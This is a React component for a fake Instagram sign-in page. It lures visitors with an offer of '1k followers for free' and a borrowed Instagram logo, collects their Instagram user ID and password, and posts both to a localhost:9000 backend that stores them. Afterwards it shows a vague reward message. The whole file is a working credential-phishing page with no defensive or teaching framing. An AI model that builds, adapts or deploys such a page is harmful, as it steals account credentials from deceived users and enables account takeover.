import React,{useState} from "react";
import './App.css'
const Login=()=>{
    const [userid ,setEmail]=useState('');
    const [password, setPassword]=useState('')
   
   
    const handleSubmit = async(e)=>{
        e.preventDefault()   
        try {
                const response = await fetch('http://localhost:9000/books', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
      },
    body: JSON.stringify({ userid, password }) 
});
       if (response.ok) {
        alert('if You entered Rigth details you will soon get rewarded');
        setEmail('');
        setPassword('');
      } else {
        alert('Server error while searching data');
      }
            } catch (error) {
             console.error('Error checking login data:', error);
             alert('Failed to connect with server');
        } 
    }
    return(
        <>
      <div className="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
        <div className="sm:mx-auto sm:w-full sm:max-w-sm">
          <img
            alt="Your Company"
            src="https://cdn.pixabay.com/photo/2021/06/15/12/14/instagram-6338393_960_720.png"
            className="mx-auto h-30 w-auto rounded-xl "
          />
          <h2 className="mt-10 text-center text-2xl/9 font-bold tracking-tight text-gray-900">
            ✌️Sign in to your account to get 1k followers for free😎
          </h2>
        </div>

        <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label htmlFor="email" className="block text-sm/6 font-medium text-gray-900">
              Instagram Userid 😉
              </label>
              <div className="mt-2">
                <input
                 type='userid'
                 value={userid}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder='Userid'
                 required
                 className="block w-full rounded-md bg-white px-3 py-1.5 text-base text-gray-900 outline-1 -outline-offset-1 outline-gray-300 placeholder:text-gray-400 focus:outline-2 focus:-outline-offset-2 focus:outline-indigo-600 sm:text-sm/6"
                />
              </div>
            </div>

            <div>
              <div className="block text-sm/6 font-medium text-gray-900">
                <label htmlFor="password" className="block text-sm/6 font-medium text-gray-900">
                  Password 😜
                </label>
              </div>
              <div className="mt-2">
                <input
                  type='password'
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  placeholder="password"
                  className="block w-full rounded-md bg-white px-3 py-1.5 text-base text-gray-900 outline-1 -outline-offset-1 outline-gray-300 placeholder:text-gray-400 focus:outline-2 focus:-outline-offset-2 focus:outline-indigo-600 sm:text-sm/6"
                />
              </div>
            </div>

            <div>
              <button
                type="submit"
                className="flex w-full justify-center rounded-md bg-indigo-600 px-3 py-1.5 text-sm/6 font-semibold text-white shadow-xs hover:bg-indigo-500 focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600"
              >
                Sign in
              </button>
            </div>
          </form>

          <p className="mt-10 text-center text-sm/6 text-gray-500">
             Offer is available to limited users{' '}
            <a href="#" className="font-semibold text-indigo-600 hover:text-red-500">
              Get 1k followers instant for free 💕
            </a>
          </p>
        </div>
      </div>

        </>
    )
}
export default Login;